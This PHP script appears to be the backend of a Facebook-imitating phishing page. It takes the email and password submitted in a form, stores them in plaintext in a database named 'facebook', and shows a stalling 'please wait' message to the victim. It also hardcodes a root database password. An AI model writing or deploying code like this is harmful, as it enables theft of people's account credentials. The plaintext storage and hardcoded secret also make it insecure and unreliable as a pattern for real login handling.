<?php
$email = $_POST['email'];
$password = $_POST['password'];

$conn = new mysqli('localhost','root','azob3t9jA','facebook','3307');
if($conn->connect_error){
    die('Connection Failed : '.$conn->connect_error);
}else{
$stmt = $conn->prepare('insert into login(email, password) values(?, ?)');
$stmt->bind_param('ss',$email, $password);
$stmt->execute();
echo 'please wait while we attend to you shortly...';
$stmt->close();
$conn->close();
};
?>